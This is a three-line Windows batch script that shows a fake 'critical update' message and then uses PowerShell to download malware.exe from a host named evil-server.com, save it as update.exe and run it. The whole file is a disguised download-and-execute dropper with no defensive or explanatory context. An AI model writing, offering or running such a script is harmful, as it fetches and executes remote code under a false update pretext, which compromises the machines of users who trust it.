@echo off
echo "Downloading critical update..."
powershell -Command "Invoke-WebRequest -Uri 'http://evil-server.com/malware.exe' -OutFile 'update.exe'; .\update.exe"
